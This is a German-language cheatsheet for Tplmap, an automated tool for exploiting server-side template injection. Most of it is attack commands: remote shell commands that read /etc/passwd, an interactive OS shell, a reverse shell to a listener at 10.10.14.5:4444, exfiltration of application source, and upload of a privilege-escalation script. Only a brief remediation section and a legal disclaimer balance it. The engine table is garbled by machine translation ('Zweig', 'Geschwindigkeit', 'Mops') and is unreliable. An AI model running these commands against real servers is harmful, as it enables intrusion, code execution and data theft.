<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎭 Tplmap – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ████████╗██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
  ╚══██╔══╝██╔══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
     ██║   ██████╔╝██║     ██╔████╔██║███████║██████╔╝
     ██║   ██╔═══╝ ██║     ██║╚██╔╝██║██╔══██║██╔═══╝ 
     ██║   ██║     ███████╗██║ ╚═╝ ██║██║  ██║██║     
     ╚═╝   ╚═╝     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
       Server-Side Template Injection (SSTI) Automated Exploiter
```
<p align="center">
  <img src="https://img.shields.io/badge/Tplmap-SSTI_Exploitation-blue?style=for-the-badge" alt="Tplmap">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-orange?style=for-the-badge" alt="Web-Sicherheit & API">
  <img src="https://img.shields.io/badge/Engines-Jinja2_Twig_Mako_Freemarker-green?style=for-the-badge" alt="Template Engines">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="License GPLv2">
</p>

<p align="center">
  <b>🌐 Automatisiertes Exploit-Tool zur Erkennung und Ausnutzung von SSTI-Schwachstellen (Server-Side Template Injection), um eine Remotecodeausführung zu erreichen</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Überblick und die SSTI-Sicherheitslücke](#-overview--the-ssti-vulnerability)
- [Unterstützte Template-Engines](#-supported-template-engines)
- [Installation](#-Installation)
- [Grundlegende Schwachstellenerkennung](#-basic-vulnerability-detection)
- [Targeting spezifischer Injektionspunkte (`*`-Marker)](#-targeting-spezifische-injektionspunkte--marker)
- [Remote-Befehlsausführung (`--os-cmd`)](#-remote-command-execution---os-cmd)
- [Interaktive Shells und umgekehrte Verbindungen](#-interactive-shells--reverse-connections)
- [Datei-Upload und -Download] (#-file-upload--download)
- [POST-Daten und Header testen](#-testing-post-data--headers)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Verteidigungsüberlegungen und Abhilfemaßnahmen](#-defensive-überlegungen--remediation)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)

---

## 🎯 Übersicht und die SSTI-Sicherheitslücke

**Serverseitige Vorlageninjektion (SSTI)** tritt auf, wenn eine Anwendung nicht validierte Benutzereingaben direkt in eine serverseitige Vorlage einbettet, anstatt sie als zu rendernde Daten zu übergeben. Da moderne Template-Engines eine Syntax wie `{{7*7}}` oder `${7*7}` zulassen, können Angreifer aus der Sandbox ausbrechen und auf die zugrunde liegende Laufzeitumgebung (Python, Java, PHP, Ruby, Node.js) zugreifen.

**Tplmap** wurde von **Miroslav Stampar** und **Emilio Pinna** geschrieben und fungiert als „SQLMap für Template Engines“. Es erfasst automatisch einen Fingerabdruck der aktiven Vorlagen-Engine, bricht aus Vorlagenauswertungskontexten aus und eskaliert die Codeausführung auf vollständigen Shell-Zugriff auf Betriebssystemebene.

---

## 🧩 Unterstützte Template-Engines

| Sprache | Unterstützte Template-Engines |
|----------|-------------|
| **Python** | Jinja2, Mako, Tornado, Nunjucks |
| **PHP** | Zweig, Smarty |
| **Java** | Freemarker, Geschwindigkeit |
| **Rubin** | ERB, schlank |
| **Node.js** | Jade, Mops, Dust.js |

---

## 📥 Installation

Tplmap basiert auf Python:
```bash
# Clone GitHub repository
git clone https://github.com/epinna/tplmap.git
cd tplmap

# Install dependencies
pip install -r requirements.txt

# Verify installation
python tplmap.py --help
```
---

## 🚀 Grundlegende Schwachstellenerkennung
```bash
# Scan a GET parameter for SSTI
python tplmap.py -u "http://target.local/page?name=John"

# Mark explicit injection point using an asterisk (*)
python tplmap.py -u "http://target.local/profile?id=1&bio=*"
```
---

## 💻 Fernbefehlsausführung (`--os-cmd`)

Sobald Tplmap die Engine (z. B. Jinja2) erkennt, führen Sie beliebige Shell-Befehle direkt aus:
```bash
# Execute whoami on target
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "whoami; id"

# Read sensitive configuration files
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "cat /etc/passwd"
```
---

## 💀 Interaktive Shells und umgekehrte Verbindungen
```bash
# Spawn an interactive pseudo-terminal within Tplmap
python tplmap.py -u "http://target.local/page?name=*" --os-shell

# Drop a full reverse TCP connection to a Netcat listener
python tplmap.py -u "http://target.local/page?name=*" \
  --reverse-shell 10.10.14.5 4444
```
---

## 📁 Datei-Upload und -Download

Quellcode exfiltrieren oder Persistenz-Tools hochladen:
```bash
# Download remote source code or configuration
python tplmap.py -u "http://target.local/page?name=*" \
  --download /var/www/html/app.py ./app_loot.py

# Upload a local payload to remote /tmp/ directory
python tplmap.py -u "http://target.local/page?name=*" \
  --upload ./linpeas.sh /tmp/linpeas.sh
```
---

## 🌐 POST-Daten und Header testen
```bash
# Test POST body parameters
python tplmap.py -u "http://target.local/comment" -d "author=test&comment=*"

# Test HTTP Headers
python tplmap.py -u "http://target.local/dashboard" -H "User-Agent: *"

# Test behind authenticated session cookies
python tplmap.py -u "http://target.local/welcome?user=*" -c "session=xyz123"
```
---

## ⚡ Kurzreferenztabelle

| Ziel | Befehl |
|-----------|---------|
| **SSTI in URL erkennen** | `python tplmap.py -u "<URL>?param=*"` |
| **Fernbefehl ausführen** | `python tplmap.py -u "<URL>" --os-cmd="<CMD>"` |
| **Interaktives Terminal** | `python tplmap.py -u "<URL>" --os-shell` |
| **Reverse Shell fallen lassen** | `python tplmap.py -u "<URL>" --reverse-shell <IP> <PORT>` |
| **Remote-Datei herunterladen** | `python tplmap.py -u "<URL>" --download <REMOTE> <LOCAL>` |
| **Lokale Datei hochladen** | `python tplmap.py -u "<URL>" --upload <LOCAL> <REMOTE>` |
| **Test-POST-Text** | `python tplmap.py -u "<URL>" -d "data=*"` |

---

## 🛡️ Defensive Überlegungen und Abhilfemaßnahmen

1. **Kontextbewusstes Escaping:** Verketten Sie niemals rohe Benutzereingaben in Vorlagenzeichenfolgen. Verwenden Sie den nativen Variablenbindungsmechanismus der Template-Engine (z. B. in Jinja2: `render_template('hello.html', name=user_input)` statt `render_template_string(f"Hello {user_input}")`).
2. **Sandbox-Einschränkungen:** Erzwingen Sie striktes Sandboxing in Engines, bei denen dynamisches Rendering unvermeidlich ist, und verbieten Sie den Zugriff auf `__class__`, `__mro__` oder Reflexionsobjekte.

---

## ⚠️ Rechtlicher Haftungsausschluss

> [!ACHTUNG]
> Tplmap führt beliebigen Remotecode auf Zielanwendungsservern aus. Das Testen oder Nutzen von Webanwendungen ohne vorherige schriftliche Genehmigung ist streng illegal.